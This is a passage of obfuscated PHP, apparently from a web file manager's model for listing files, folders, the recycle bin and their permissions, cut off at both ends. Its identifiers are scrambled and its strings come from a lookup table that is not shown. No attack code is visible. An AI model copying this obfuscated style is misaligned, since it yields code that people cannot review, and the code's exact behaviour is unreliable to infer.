$†êíúÔô[$ûÁûÑ¼£[92]] = array_merge($†êíúÔô[$ûÁûÑ¼£[92]], $óšÃ„†¼); $†êíúÔô[$ûÁûÑ¼£[93]] = array_merge($†êíúÔô[$ûÁûÑ¼£[93]], $“«ˆµù); if (isset($†êíúÔô[$ûÁûÑ¼£[419]]) && count($Ü™ª½ÈÙ) == $†êíúÔô[$ûÁûÑ¼£[419]][$ûÁûÑ¼£[420]]) { return $†êíúÔô; } $“ô™»¿‡ = array(); $ˆÄùú ü = array_to_keyvalue($†êíúÔô[$ûÁûÑ¼£[92]], $ûÁûÑ¼£[22], $ûÁûÑ¼£[191]); $Çöú£öÁ = array_to_keyvalue($†êíúÔô[$ûÁûÑ¼£[93]], $ûÁûÑ¼£[22], $ûÁûÑ¼£[191]); $™ãÖ£ù = array_merge($Çöú£öÁ, $ˆÄùú ü); foreach ($Ü™ª½ÈÙ as $Ó¥ßÍû¶) { if (!in_array($Ó¥ßÍû¶, $™ãÖ£ù)) { $“ô™»¿‡[] = $Ó¥ßÍû¶; } } if ($“ô™»¿‡) { Model($ûÁûÑ¼£[479])->removeBySource($“ô™»¿‡); } return $†êíúÔô; } public function listUserRecycle() { $»‘›¨™‚ =& $_SERVER[ú÷îèÆÜ]; $…‹¼«™œ = Model($»‘›¨™‚[480])->listData(); if (!$…‹¼«™œ) { return array(); } $¢ĞÑµ×¦ = array($»‘›¨™‚[468] => array($»‘›¨™‚[469], $…‹¼«™œ), $»‘›¨™‚[481] => 1); return $this->listSource($¢ĞÑµ×¦); } public function listSource($íµŞèõÌ, $á•‘í° = 3000, $ï‡Ÿ³ê… = false) { $ŒŠÇ“Ã¯ =& $_SERVER[ú÷îèÆÜ]; if (!isset($íµŞèõÌ[$ŒŠÇ“Ã¯[482]])) { $íµŞèõÌ[$ŒŠÇ“Ã¯[482]] = 0; } if (isset($íµŞèõÌ[$ŒŠÇ“Ã¯[190]]) && $íµŞèõÌ[$ŒŠÇ“Ã¯[190]] == $ŒŠÇ“Ã¯[222]) { $íµŞèõÌ[$ŒŠÇ“Ã¯[463]] = array($ŒŠÇ“Ã¯[384], $ŒŠÇ“Ã¯[483]); } $ÓãŠ¹ì = $ŒŠÇ“Ã¯[484]; $Åš‘äëú = $this->field($ÓãŠ¹ì)->_makeOrder()->where($íµŞèõÌ)->selectPage($á•‘í°); $this->_listPageCheck($Åš‘äëú, $ÓãŠ¹ì, $íµŞèõÌ); $this->_listDataApply($Åš‘äëú[$ŒŠÇ“Ã¯[422]], $ï‡Ÿ³ê…); $this->_listMake($Åš‘äëú); return $Åš‘äëú; } private function _listPageCheck(&$·‡ÍÑ„Ş, $ÈÊÉéÄ, $­¨ä–Ğû) { $’‡øä—œ =& $_SERVER[ú÷îèÆÜ]; if (!is_array($·‡ÍÑ„Ş[$’‡øä—œ[419]])) { return; } $ü½®õëı = $·‡ÍÑ„Ş[$’‡øä—œ[419]]; if ($ü½®õëı[$’‡øä—œ[421]] <= 1) { return; } if ($ü½®õëı[$’‡øä—œ[420]] >= 100000) { return; } if (Model($’‡øä—œ[485])->get($’‡øä—œ[486]) != $’‡øä—œ[487]) { return; } $ÈÊÉéÄ = str_replace(array($’‡øä—œ[63], $’‡øä—œ[395], $’‡øä—œ[11]), $’‡øä—œ[22], $ÈÊÉéÄ); $ÈÊÉéÄ = $’‡øä—œ[488] . str_replace($’‡øä—œ[60], $’‡øä—œ[489], $ÈÊÉéÄ) . $’‡øä—œ[490]; $üà•äîï = $’‡øä—œ[491]; $üà•äîï = $üà•äîï . $’‡øä—œ[492]; $„ıŸ¢ôÈ = $ü½®õëı[$’‡øä—œ[416]] * ($ü½®õëı[$’‡øä—œ[406]] - 1) . $’‡øä—œ[60] . $ü½®õëı[$’‡øä—œ[416]]; $°… Ìç = $this->_makeOrder(!0); $…¸ÔÙ³ = $’‡øä—œ[488] . str_replace($’‡øä—œ[60], $’‡øä—œ[489], $°… Ìç[0]); if (strpos($…¸ÔÙ³, $’‡øä—œ[493])) { $…¸ÔÙ³ = str_replace($’‡øä—œ[493], $’‡øä—œ[494], $…¸ÔÙ³); } else { $…¸ÔÙ³ .= $’‡øä—œ[495] . $°… Ìç[1]; } $Ã¨•ù•ã = array(); foreach ($­¨ä–Ğû as $Àé’Ş‹Ğ => $™úë°Û•) { $Ã¨•ù•ã[$’‡øä—œ[488] . $Àé’Ş‹Ğ] = $™úë°Û•; } $this->alias($’‡øä—œ[496])->field($ÈÊÉéÄ)->limit($„ıŸ¢ôÈ)->order($…¸ÔÙ³); $Âéàö½ = $this->join($üà•äîï)->where($Ã¨•ù•ã)->select(); if ($Âéàö½) { $·‡ÍÑ„Ş[$’‡øä—œ[422]] = $Âéàö½; } } protected function _makeOrder($Ã˜çÅÀ = false) { $Ì¥«½ =& $_SERVER[ú÷îèÆÜ]; $Û—«…ÈÔ = Model($Ì¥«½[497])->get($Ì¥«½[498]); $²—ôÎ¤ƒ = Model($Ì¥«½[497])->get($Ì¥«½[499]); $úû¾¢ÕÎ = array($Ì¥«½[500] => $Ì¥«½[501], $Ì¥«½[502] => $Ì¥«½[503]); $ßŸÇ¡«µ = array($Ì¥«½[42] => $Ì¥«½[42], $Ì¥«½[86] => $Ì¥«½[86], $Ì¥«½[185] => $Ì¥«½[463], $Ì¥«½[504] => $Ì¥«½[504], $Ì¥«½[505] => $Ì¥«½[506], $Ì¥«½[225] => $Ì¥«½[225], $Ì¥«½[95] => $Ì¥«½[95]); $Ü«Ì×ğÔ = Input::get($Ì¥«½[507], $Ì¥«½[17], $Û—«…ÈÔ, array_keys($ßŸÇ¡«µ)); $ö²¿¸äİ = Input::get($Ì¥«½[508], $Ì¥«½[17], $²—ôÎ¤ƒ, array_keys($úû¾¢ÕÎ)); if (!in_array($Ü«Ì×ğÔ, array_keys($ßŸÇ¡«µ))) { $Ü«Ì×ğÔ = $Ì¥«½[42]; } if (!in_array($ö²¿¸äİ, array_keys($úû¾¢ÕÎ))) { $Ü«Ì×ğÔ = $Ì¥«½[500]; } if ($Ü«Ì×ğÔ == $Ì¥«½[42]) { } $¿î†ãÁò = $Ì¥«½[509] . $ßŸÇ¡«µ[$Ü«Ì×ğÔ] . $Ì¥«½[63] . $úû¾¢ÕÎ[$ö²¿¸äİ]; $¿î†ãÁò = rtrim(trim($¿î†ãÁò), $Ì¥«½[60]); if ($Ã˜çÅÀ) { return array($¿î†ãÁò, $úû¾¢ÕÎ[$ö²¿¸äİ]); } return $this->order($¿î†ãÁò); } protected function _listDataApplyItem($ú“Õ‰Ï, $¡Šåòä = false) { $Éóé§™Ò = array($ú“Õ‰Ï); $this->_listDataApply($Éóé§™Ò, $¡Šåòä); return $Éóé§™Ò[0]; } protected function _listDataApply(&$®²Ùƒƒ, $¬¾èÒó÷ = false) { $ê—² Õê =& $_SERVER[ú÷îèÆÜ]; if (!$®²Ùƒƒ) { $®²Ùƒƒ = array(); return; } $ŒÉ•Éô» = array_to_keyvalue($®²Ùƒƒ, $ê—² Õê[22], $ê—² Õê[191]); $ŒÉ•Éô» = array_unique($ŒÉ•Éô»); $this->_listSourceCache($®²Ùƒƒ); if (!$¬¾èÒó÷) { $this->_listAppendMeta($®²Ùƒƒ, $ŒÉ•Éô»); $this->_listAppendFileMeta($®²Ùƒƒ, $ŒÉ•Éô»); $this->_listAppendChildren($®²Ùƒƒ, $ŒÉ•Éô»); } $this->_listAppendPath($®²Ùƒƒ); $this->_listAppendAuth($®²Ùƒƒ); $this->_listAppendSourceInfo($®²Ùƒƒ, $ŒÉ•Éô»); $this->_listAppendUser($®²Ùƒƒ); $this->_listFilterInfo($®²Ùƒƒ, $¬¾èÒó÷); $this->_listAppendAuthSecret($®²Ùƒƒ); } protected function _listSourceCache($ãŒî¼ÊÓ) { $±³”©õß =& $_SERVER[ú÷îèÆÜ]; foreach ($ãŒî¼ÊÓ as $½ôå£Íñ) { self::$cacheSourceInfo[$±³”©õß[510] . $½ôå£Íñ[$±³”©õß[191]]] = $½ôå£Íñ; } } protected function _listFilterInfo(&$Åâı´ë, $Éø¨³Ë³ = false) { $€†™úšº =& $_SERVER[ú÷îèÆÜ]; foreach ($Åâı´ë as &$éë‡Ñ‰§) { $éë‡Ñ‰§ = $this->pathInfoFilter($éë‡Ñ‰§); self::$cachePathInfo[$€†™úšº[511] . intval($Éø¨³Ë³) . $€†™úšº[439] . $éë‡Ñ‰§[$€†™úšº[191]]] = $éë‡Ñ‰§; } unset($éë‡Ñ‰§); } protected function _listMake(&$ñ§–€á) { $¾·Èç£ =& $_SERVER[ú÷îèÆÜ]; $ñ§–€á[$¾·Èç£[92]] = array(); $ñ§–€á[$¾·Èç£[93]] = array(); foreach ($ñ§–€á[$¾·Èç£[422]] as $Ò¢öÚ¼Œ) { $µù¤†ßğ = $Ò¢öÚ¼Œ[$¾·Èç£[462]] == 1 ? $¾·Èç£[92] : $¾·Èç£[93]; $ñ§–€á[$µù¤†ßğ][] = $Ò¢öÚ¼Œ; } unset($ñ§–€á[$¾·Èç£[422]]); } protected function _listAppendMeta(&$›í‰¤Ç­, $êŸÑ¨Í) { $ºƒÀ÷Ğ˜ =& $_SERVER[ú÷îèÆÜ]; $Ù»²Í¡‡ = array($ºƒÀ÷Ğ˜[468] => array($ºƒÀ÷Ğ˜[469], $êŸÑ¨Í)); $üÔ˜òÃ¸ = Model($ºƒÀ÷Ğ˜[512])->field($ºƒÀ÷Ğ˜[513])->where($Ù»²Í¡‡)->select(); if (!$üÔ˜òÃ¸) { return; } $°Ó“ïÀ— = array($ºƒÀ÷Ğ˜[514], $ºƒÀ÷Ğ˜[515], $ºƒÀ÷Ğ˜[494]); $úÄÓİâÍ = array(); foreach ($üÔ˜òÃ¸ as $‚ìÊ²±Ê) { if (!isset($úÄÓİâÍ[$‚ìÊ²±Ê[$ºƒÀ÷Ğ˜[191]]])) { $úÄÓİâÍ[$‚ìÊ²±Ê[$ºƒÀ÷Ğ˜[191]]] = array(); } if (in_array($‚ìÊ²±Ê[$ºƒÀ÷Ğ˜[104]], $°Ó“ïÀ—)) { continue; } $úÄÓİâÍ[$‚ìÊ²±Ê[$ºƒÀ÷Ğ˜[191]]][$‚ìÊ²±Ê[$ºƒÀ÷Ğ˜[104]]] = $‚ìÊ²±Ê[$ºƒÀ÷Ğ˜[427]]; } foreach ($›í‰¤Ç­ as &$ìï½¢Ğ) { $ìï½¢Ğ[$ºƒÀ÷Ğ˜[516]] = !1; if (isset($úÄÓİâÍ[$ìï½¢Ğ[$ºƒÀ÷Ğ˜[191]]])) { $ìï½¢Ğ[$ºƒÀ÷Ğ˜[516]] = $úÄÓİâÍ[$ìï½¢Ğ[$ºƒÀ÷Ğ˜[191]]]; } if ($this->fileIsLock($ìï½¢Ğ) && $ìï½¢Ğ[$ºƒÀ÷Ğ˜[464]]) { $ÒäÊ˜ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ìï½¢Ğ[$ºƒÀ÷Ğ˜[464]][$ºƒÀ÷Ğ˜[465]] = AuthModel::authDisable($ìï½¢Ğ[$ºƒÀ÷Ğ˜[464]][$ºƒÀ÷Ğ˜[465]], $ÒäÊ˜); $ìï½¢Ğ[$ºƒÀ÷Ğ˜[464]][$ºƒÀ÷Ğ˜[517]][$ºƒÀ÷Ğ˜[464]] = $ìï½¢Ğ[$ºƒÀ÷Ğ˜[464]][$ºƒÀ÷Ğ˜[465]]; } } unset($ìï½¢Ğ); } protected function _listAppendFileMeta(&$­Ò¦²‹Ø, $­ïÏÏçÃ) { $û„Ñ–èª =& $_SERVER[ú÷îèÆÜ]; $‘±«òÔÊ = array_to_keyvalue($­Ò¦²‹Ø, $û„Ñ–èª[22], $û„Ñ–èª[518]); $‘±«òÔÊ = array_filter(array_unique($‘±«òÔÊ)); if (!$‘±«òÔÊ) { return; } $Ø‚»ôŞš = array($û„Ñ–èª[519] => array($û„Ñ–èª[469], $‘±«òÔÊ)); $›·àó… = $û„Ñ–èª[520]; $öì˜‡Ï = Model($û„Ñ–èª[521])->field($›·àó…)->where($Ø‚»ôŞš)->select(); $öì˜‡Ï = array_to_keyvalue($öì˜‡Ï, $û„Ñ–èª[518]); $×Ë÷¤ç = Model($û„Ñ–èª[522])->field($û„Ñ–èª[523])->where($Ø‚»ôŞš)->select(); $×Ë÷¤ç = $×Ë÷¤ç ? $×Ë÷¤ç : array(); $ûú²šÎª = array(); foreach ($×Ë÷¤ç as $Š·»ó–¶) { if (!isset($ûú²šÎª[$Š·»ó–¶[$û„Ñ–èª[518]]])) { $ûú²šÎª[$Š·»ó–¶[$û„Ñ–èª[518]]] = array(); } $ûú²šÎª[$Š·»ó–¶[$û„Ñ–èª[518]]][$Š·»ó–¶[$û„Ñ–èª[104]]] = $Š·»ó–¶[$û„Ñ–èª[427]]; } foreach ($­Ò¦²‹Ø as &$·úÑˆ) { $šÍ½æ† = $·úÑˆ[$û„Ñ–èª[518]]; if (!$šÍ½æ† || !is_array($öì˜‡Ï[$šÍ½æ†])) { continue; } $¤ô›¾­ = $öì˜‡Ï[$šÍ½æ†]; $¤ô›¾­[$û„Ñ–èª[86]] = $·úÑˆ[$û„Ñ–èª[86]]; $¤ô›¾­[$û„Ñ–èª[42]] = $·úÑˆ[$û„Ñ–èª[42]]; if (!isset(self::$cacheFileInfo[$û„Ñ–èª[524] . $šÍ½æ†])) { self::$cacheFileInfo[$û„Ñ–èª[524] . $šÍ½æ†] = array_merge(array(), $¤ô›¾­); } unset($öì˜‡Ï[$šÍ½æ†][$û„Ñ–èª[94]]); $İ–ğ‰ì˜ = is_array($ûú²šÎª[$šÍ½æ†]) ? $ûú²šÎª[$šÍ½æ†] : array(); $·úÑˆ[$û„Ñ–èª[525]] = array_merge($İ–ğ‰ì˜, $öì˜‡Ï[$šÍ½æ†]); if (isset($·úÑˆ[$û„Ñ–èª[525]][$û„Ñ–èª[181]])) { $·úÑˆ[$û„Ñ–èª[181]] = json_decode($·úÑˆ[$û„Ñ–èª[525]][$û„Ñ–èª[181]], !0); unset($·úÑˆ[$û„Ñ–èª[525]][$û„Ñ–èª[181]]); } } unset($·úÑˆ); } protected function _listAppendSourceInfo(&$ÙÂÄåş”, $ş¢êˆì·) { $±…úšÌÅ =& $_SERVER[ú÷îèÆÜ]; $¨åÀş‚ƒ = Model($±…úšÌÅ[526])->listData(); $í’ ¶Ó = Model($±…úšÌÅ[476])->listData(); $æ«Ä—‚ò = Model($±…úšÌÅ[466])->listData(); $ş‡—ö­ƒ = Model($±…úšÌÅ[527])->listSimple(); $­·ß€²¥ = array_to_keyvalue($¨åÀş‚ƒ, $±…úšÌÅ[452]); $À±â·¹İ = array_to_keyvalue_group($í’ ¶Ó, $±…úšÌÅ[94], $±…úšÌÅ[477]); $ô€ë´ = array_to_keyvalue($æ«Ä—‚ò, $±…úšÌÅ[94]); $§ääéÂ° = array_to_keyvalue_group($ş‡—ö­ƒ, $±…úšÌÅ[191]); foreach ($ÙÂÄåş” as &$ïƒ±¯ş) { $ïƒ±¯ş[$±…úšÌÅ[97]] = array($±…úšÌÅ[528] => 0, $±…úšÌÅ[529] => 0, $±…úšÌÅ[530] => 0); if (isset($ô€ë´[$ïƒ±¯ş[$±…úšÌÅ[191]]])) { $ïƒ±¯ş[$±…úšÌÅ[97]][$±…úšÌÅ[531]] = 1; $ïƒ±¯ş[$±…úšÌÅ[97]][$±…úšÌÅ[532]] = $ô€ë´[$ïƒ±¯ş[$±…úšÌÅ[191]]][$±…úšÌÅ[42]]; } if ($À±â·¹İ && $­·ß€²¥ && isset($À±â·¹İ[$ïƒ±¯ş[$±…úšÌÅ[191]]])) { $ïƒ±¯ş[$±…úšÌÅ[97]][$±…úšÌÅ[533]] = array(); foreach ($À±â·¹İ[$ïƒ±¯ş[$±…úšÌÅ[191]]] as $˜µíÅŠÓ) { $í’ĞÉ• = $­·ß€²¥[$˜µíÅŠÓ]; $ïƒ±¯ş[$±…úšÌÅ[97]][$±…úšÌÅ[533]][] = array($±…úšÌÅ[534] => $í’ĞÉ•[$±…úšÌÅ[452]], $±…úšÌÅ[471] => $í’ĞÉ•[$±…úšÌÅ[42]], $±…úšÌÅ[535] => $í’ĞÉ•[$±…úšÌÅ[536]]); } } if ($§ääéÂ° && isset($§ääéÂ°[$ïƒ±¯ş[$±…úšÌÅ[191]]])) { $ïƒ±¯ş[$±…úšÌÅ[97]][$±…úšÌÅ[537]] = array(); foreach ($§ääéÂ°[$ïƒ±¯ş[$±…úšÌÅ[191]]] as $†´Ãéµß) { $¿»•¦¨ä = $±…úšÌÅ[538]; if ($†´Ãéµß[$±…úšÌÅ[539]] == $±…úšÌÅ[98]) { $¿»•¦¨ä .= $±…úšÌÅ[540]; } $ïƒ±¯ş[$±…úšÌÅ[97]][$±…úšÌÅ[537]] = array_field_key($†´Ãéµß, explode($±…úšÌÅ[60], $¿»•¦¨ä)); } } } unset($ïƒ±¯ş); return $ÙÂÄåş”; } protected function _listAppendChildren(&$ÔÜ»‡ª, $«¦â¬¡) { $ëô¨øüÑ =& $_SERVER[ú÷îèÆÜ]; $å•¯Œ÷ˆ = array(); $ÙÈ“Æ¤’ = array($ëô¨øüÑ[233] => 0, $ëô¨øüÑ[234] => 0); foreach ($ÔÜ»‡ª as &$¤ˆ‚ä£) { if (!$¤ˆ‚ä£[$ëô¨øüÑ[462]]) { continue; } $å•¯Œ÷ˆ[] = $¤ˆ‚ä£[$ëô¨øüÑ[191]]; } unset($¤ˆ‚ä£); if (!$å•¯Œ÷ˆ) { return; } $ş´†ƒ…õ = array($ëô¨øüÑ[190] => array($ëô¨øüÑ[17], $å•¯Œ÷ˆ), $ëô¨øüÑ[482] => 0); $Î¤î¦Çç = array($ëô¨øüÑ[190], $ëô¨øüÑ[462], $ëô¨øüÑ[541] => $ëô¨øüÑ[542]); $ƒ·ó¬ñú = $this->field($Î¤î¦Çç)->where($ş´†ƒ…õ)->group($ëô¨øüÑ[543])->select(); $§³„ğëœ = array(); foreach ($ƒ·ó¬ñú as $¯™äôæù) { $Ë²¸åè“ = $¯™äôæù[$ëô¨øüÑ[190]]; $·‡ªíÄû = $¯™äôæù[$ëô¨øüÑ[462]] == $ëô¨øüÑ[98] ? $ëô¨øüÑ[234] : $ëô¨øüÑ[233]; if (!isset($§³„ğëœ[$Ë²¸åè“])) { $§³„ğëœ[$Ë²¸åè“] = array($ëô¨øüÑ[233] => 0, $ëô¨øüÑ[234] => 0); } $§³„ğëœ[$Ë²¸åè“][$·‡ªíÄû] += $¯™äôæù[$ëô¨øüÑ[542]]; } foreach ($ÔÜ»‡ª as &$¤ˆ‚ä£) { if (!$¤ˆ‚ä£[$ëô¨øüÑ[462]]) { continue; } $˜üµøâğ = is_array($§³„ğëœ[$¤ˆ‚ä£[$ëô¨øüÑ[191]]]) ? $§³„ğëœ[$¤ˆ‚ä£[$ëô¨øüÑ[191]]] : $ÙÈ“Æ¤’; $¤ˆ‚ä£[$ëô¨øüÑ[234]] = $˜üµøâğ[$ëô¨øüÑ[234]]; $¤ˆ‚ä£[$ëô¨øüÑ[233]] = $˜üµøâğ[$ëô¨øüÑ[233]]; unset($¤ˆ‚ä£[$ëô¨øüÑ[463]]); } unset($¤ˆ‚ä£); } protected function _listAppendAuth(&$½Ä…ìó) { $À¾­¥æÀ =& $_SERVER[ú÷îèÆÜ]; $È¬´»ÇÈ = array(); foreach ($½Ä…ìó as $ë•ĞÃ÷‚) { if ($ë•ĞÃ÷‚[$À¾­¥æÀ[188]] == self::TYPE_GROUP) { $È¬´»ÇÈ[] = $ë•ĞÃ÷‚[$À¾­¥æÀ[191]]; } } if (!$È¬´»ÇÈ) { return; } $•°•Íß = array_to_keyvalue($½Ä…ìó, $À¾­¥æÀ[191]); $€”’Åå = Model($À¾­¥æÀ[544])->getSourceList($È¬´»ÇÈ, $•°•Íß); $šı´‘å = $GLOBALS[$À¾­¥æÀ[545]] == 1; foreach ($½Ä…ìó as $é…’û => &$ë•ĞÃ÷‚) { $ë•ĞÃ÷‚[$À¾­¥æÀ[464]] = $€”’Åå[$ë•ĞÃ÷‚[$À¾­¥æÀ[191]]]; if (!$ë•ĞÃ÷‚[$À¾­¥æÀ[464]] && $ë•ĞÃ÷‚[$À¾­¥æÀ[188]] == self::TYPE_GROUP) { $ë•ĞÃ÷‚[$À¾­¥æÀ[464]] = Action($À¾­¥æÀ[546])->pathGroupAuthMake($ë•ĞÃ÷‚[$À¾­¥æÀ[547]]); if (!$ë•ĞÃ÷‚[$À¾­¥æÀ[464]] && !$šı´‘å) { $ë•ĞÃ÷‚[$À¾­¥æÀ[227]] = !1; $ë•ĞÃ÷‚[$À¾­¥æÀ[226]] = !1; } } if ($ë•ĞÃ÷‚[$À¾­¥æÀ[464]]) { $ë•ĞÃ÷‚[$À¾­¥æÀ[227]] = AuthModel::authCheckEdit($ë•ĞÃ÷‚[$À¾­¥æÀ[464]][$À¾­¥æÀ[465]]); $ë•ĞÃ÷‚[$À¾­¥æÀ[226]] = AuthModel::authCheckView($ë•ĞÃ÷‚[$À¾­¥æÀ[464]][$À¾­¥æÀ[465]]); } $this->groupPathDisplay($ë•ĞÃ÷‚); } unset($ë•ĞÃ÷‚); } public function _listAppendAuthSecret(&$±ÍÇ¯Ê„) { $§ûïÉÑ =& $_SERVER[ú÷îèÆÜ]; if (Model($§ûïÉÑ[485])->get($§ûïÉÑ[548]) != $§ûïÉÑ[98]) { return; } static $¡…¨Å†Ç = false; if (!$¡…¨Å†Ç) { $óäº±’¸ = Model($§ûïÉÑ[549]); $…Ì‘‘†‡ = Model($§ûïÉÑ[550]); $¡…¨Å†Ç = $…Ì‘‘†‡->listData(); $¡…¨Å†Ç = array_to_keyvalue($¡…¨Å†Ç, $§ûïÉÑ[191]); $ö»ˆª“× = json_decode(Model($§ûïÉÑ[485])->get($§ûïÉÑ[551]), !0); $ö»ˆª“× = array_to_keyvalue($ö»ˆª“×, $§ûïÉÑ[452]); foreach ($¡…¨Å†Ç as $÷€ ­Â => $ª×ê¬ì¾) { $ ®®×óˆ = $ö»ˆª“×[$ª×ê¬ì¾[$§ûïÉÑ[552]]]; if (!$ ®®×óˆ) { $…Ì‘‘†‡->remove($ª×ê¬ì¾[$§ûïÉÑ[452]]); unset($¡…¨Å†Ç[$÷€ ­Â]); continue; } $×‹Û ¡ = $óäº±’¸->listData($ ®®×óˆ[$§ûïÉÑ[464]]); if (!$×‹Û ¡) { $…Ì‘‘†‡->remove($ª×ê¬ì¾[$§ûïÉÑ[452]]); unset($¡…¨Å†Ç[$÷€ ­Â]); continue; } $ª×ê¬ì¾[$§ûïÉÑ[464]] = $×‹Û ¡; $ª×ê¬ì¾[$§ûïÉÑ[553]] = $ ®®×óˆ; $ª×ê¬ì¾[$§ûïÉÑ[554]] = Model($§ûïÉÑ[555])->getInfoSimpleOuter($ª×ê¬ì¾[$§ûïÉÑ[504]]); $¡…¨Å†Ç[$÷€ ­Â] = $ª×ê¬ì¾; } } $Ş‡¯öê­ = USER_ID; $¯íšÚ×´ = array(); $èŞì¶Ï÷ = $this->_listAppendPath($¯íšÚ×´, !0); foreach ($±ÍÇ¯Ê„ as $÷€ ­Â => &$ª×ê¬ì¾) { if (!is_array($ª×ê¬ì¾[$§ûïÉÑ[464]])) { continue; } if ($ª×ê¬ì¾[$§ûïÉÑ[188]] != $§ûïÉÑ[556]) { continue; } if (isset($¡…¨Å†Ç[$ª×ê¬ì¾[$§ûïÉÑ[191]]])) { $èÒÉÚ¨— = $¡…¨Å†Ç[$ª×ê¬ì¾[$§ûïÉÑ[191]]]; if (!is_array($ª×ê¬ì¾[$§ûïÉÑ[516]])) { $ª×ê¬ì¾[$§ûïÉÑ[516]] = array(); } $ª×ê¬ì¾[$§ûïÉÑ[516]][$§ûïÉÑ[557]] = $èÒÉÚ¨—[$§ûïÉÑ[552]]; $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[558]] = $èÒÉÚ¨—; $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[559]] = $ª×ê¬ì¾[$§ûïÉÑ[560]]; $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[561]] = $§ûïÉÑ[98]; if ($èÒÉÚ¨—[$§ûïÉÑ[504]] != $Ş‡¯öê­) { $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[465]] = $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[465]] & $èÒÉÚ¨—[$§ûïÉÑ[464]][$§ûïÉÑ[464]]; } continue; } $ïÓÍšàÏ = $this->parentLevelArray($ª×ê¬ì¾[$§ûïÉÑ[562]]); $©ÄÓø›ä = array_reverse($ïÓÍšàÏ); foreach ($©ÄÓø›ä as $Ëèá–ñú => $ÌÕœ½Ã±) { if (!isset($¡…¨Å†Ç[$ÌÕœ½Ã±])) { continue; } $èÒÉÚ¨— = $¡…¨Å†Ç[$ÌÕœ½Ã±]; $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[558]] = $èÒÉÚ¨—; if ($èÒÉÚ¨—[$§ûïÉÑ[504]] != $Ş‡¯öê­) { $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[465]] = $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[465]] & $èÒÉÚ¨—[$§ûïÉÑ[464]][$§ûïÉÑ[464]]; } $Ÿ—›ã° = $§ûïÉÑ[22]; $Œ×¦´éú = count($ïÓÍšàÏ) - $Ëèá–ñú; for ($Äš”ÅÓä = 0; $Äš”ÅÓä < $Œ×¦´éú; $Äš”ÅÓä++) { if (!isset($èŞì¶Ï÷[$ïÓÍšàÏ[$Äš”ÅÓä]])) { $Ÿ—›ã° = $§ûïÉÑ[22]; break; } $Ÿ—›ã° = $Ÿ—›ã° . rtrim($èŞì¶Ï÷[$ïÓÍšàÏ[$Äš”ÅÓä]], $§ûïÉÑ[18]) . $§ûïÉÑ[18]; } $ª×ê¬ì¾[$§ûïÉÑ[464]][$§ûïÉÑ[559]] = rtrim($Ÿ—›ã°, $§ûïÉÑ[18]) . $§ûïÉÑ[18]; break; } } unset($ª×ê¬ì¾); } public function groupPathDisplay(&$í¸Àâù) { $åİ’Šª§ =& $_SERVER[ú÷îèÆÜ]; if ($í¸Àâù[$åİ’Šª§[188]] != self::TYPE_GROUP) { return; } $šÂÍ÷Š = Model($åİ’Šª§[563])->getInfo($í¸Àâù[$åİ’Šª§[547]]); $ØÑ—Ëæ = $this->parentLevelArray($šÂÍ÷Š[$åİ’Šª§[562]]); $İö¬¡ıó = $åİ’Šª§[22]; foreach ($ØÑ—Ëæ as $Òùİº„‰) { $ûöÁÔš§ = Model($åİ’Šª§[563])->getInfo($Òùİº„‰); $İö¬¡ıó .= $ûöÁÔš§[$åİ’Šª§[97]][$åİ’Šª§[191]] . $åİ’Šª§[60]; } $í¸Àâù[$åİ’Šª§[564]] = $šÂÍ÷Š[$åİ’Šª§[190]]; $í¸Àâù[$åİ’Šª§[565]] = $šÂÍ÷Š[$åİ’Šª§[562]]; $í¸Àâù[$åİ’Šª§[566]] = $šÂÍ÷Š[$åİ’Šª§[567]]; $í¸Àâù[$åİ’Šª§[568]] = $İö¬¡ıó . $šÂÍ÷Š[$åİ’Šª§[97]][$åİ’Šª§[191]]; } protected function _listAppendPath(&$£®™˜åì, $Ó°Ö = false) { $ë˜ÈÌ =& $_SERVER[ú÷îèÆÜ]; static $’ªëÂ = array(); $ß£Ş¾Ü = array(); $…Äë¹ß = array(); if ($Ó°Ö) { return $’ªëÂ; } foreach ($£®™˜åì as &$×õ¤Ä›) { $Ì–¹ŸÁ£ = $×õ¤Ä›[$ë˜ÈÌ[191]]; if ($×õ¤Ä›[$ë˜ÈÌ[462]] == $ë˜ÈÌ[98] && $×õ¤Ä›[$ë˜ÈÌ[190]] != 0) { $’ªëÂ[$Ì–¹ŸÁ£] = $×õ¤Ä›[$ë˜ÈÌ[42]]; } if ($×õ¤Ä›[$ë˜ÈÌ[462]] == $ë˜ÈÌ[98] && $×õ¤Ä›[$ë˜ÈÌ[190]] == 0) { $’ªëÂ[$Ì–¹ŸÁ£] = $this->_listAppendPathRoot($×õ¤Ä›, array()); } if (isset($…Äë¹ß[$×õ¤Ä›[$ë˜ÈÌ[562]]])) { continue; } $…Äë¹ß[$×õ¤Ä›[$ë˜ÈÌ[562]]] = !0; $ÎÇÂ¼û× = $this->parentLevelArray($×õ¤Ä›[$ë˜ÈÌ[562]]); foreach ($ÎÇÂ¼û× as $¡õ¾©Ï‡ => $•ëÃâ›) { if (isset($’ªëÂ[$•ëÃâ›])) { continue; } if ($¡õ¾©Ï‡ == 0) { $’ªëÂ[$•ëÃâ›] = $this->_listAppendPathRoot($×õ¤Ä›, $ÎÇÂ¼û×); } if ($¡õ¾©Ï‡ != 0) { $ß£Ş¾Ü[] = $•ëÃâ›; } } } unset($×õ¤Ä›); $ß£Ş¾Ü = array_unique($ß£Ş¾Ü); if (count($ß£Ş¾Ü) > 0) { $¦¦›°‡ä = array($ë˜ÈÌ[468] => array($ë˜ÈÌ[469], $ß£Ş¾Ü)); if (count($ß£Ş¾Ü) == 1) { $ÑëÊ°­¤ = $this->sourceInfo($ß£Ş¾Ü[0]); $‹’¦ ¾˜ = is_array($ÑëÊ°­¤) ? array($ÑëÊ°­¤) : !1; } else { $‹’¦ ¾˜ = $this->field($ë˜ÈÌ[569])->where($¦¦›°‡ä)->select(); } if (!$‹’¦ ¾˜) { $‹’¦ ¾˜ = array(); } foreach ($‹’¦ ¾˜ as $ÈÁĞİò£) { $’ªëÂ[$ÈÁĞİò£[$ë˜ÈÌ[191]]] = $ÈÁĞİò£[$ë˜ÈÌ[42]]; } } $çöŞñ×” = 